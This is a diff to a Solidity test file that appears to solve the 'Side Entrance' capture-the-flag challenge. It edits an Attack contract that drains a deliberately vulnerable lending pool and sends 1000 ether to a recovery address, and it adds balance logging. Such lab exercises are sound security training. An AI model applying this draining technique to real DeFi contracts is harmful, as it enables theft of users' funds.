@@ -45,9 +45,11 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        Attack attack = new Attack(TrusterLenderPool(pool));
+        emit log_named_decimal_uint("Player balance before attack:", recovery.balance, 18);
+        Attack attack = new Attack(SideEntranceLenderPool(pool));
         attack.attack();
         attack.withDrawFromPoolandSendtoRecovery();
+        emit log_named_decimal_uint("Player balance after attack:", recovery.balance, 18);
     }
 
     /**
@@ -59,8 +61,9 @@ contract SideEntranceChallenge is Test {
     }
 }
 
-contract Attack {
+contract Attack is Test{
     SideEntranceLenderPool pool;
+    address recovery = makeAddr("recovery");
 
 	constructor(SideEntranceLenderPool _pool) {
         pool = _pool;
@@ -72,7 +75,7 @@ contract Attack {
 	
     function withDrawFromPoolandSendtoRecovery() public payable {
         pool.withdraw();
-        (bool success, ) = address(recovery).call{value:1000e18}();
+        (bool success, ) = address(recovery).call{value:1000e18}("");
         require(success, "transfer failed");
     }
 
